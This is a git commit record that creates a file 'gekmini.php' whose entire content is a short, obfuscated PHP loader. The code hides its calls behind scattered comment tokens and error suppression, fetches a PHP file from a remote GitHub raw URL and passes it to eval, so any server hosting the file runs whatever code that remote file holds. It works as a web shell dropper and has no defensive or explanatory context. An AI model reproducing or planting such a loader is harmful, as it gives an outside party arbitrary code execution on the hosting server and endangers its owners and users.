4c7569303d51a4c5133dd58accd8ce7c8b3a9684
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-06-02 15:42:14 +0700

    Create gekmini.php

---
+++ gekmini.php
@@ -0,0 +1,3 @@
+<?php
+/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/gek.php")))); /**/
+?>
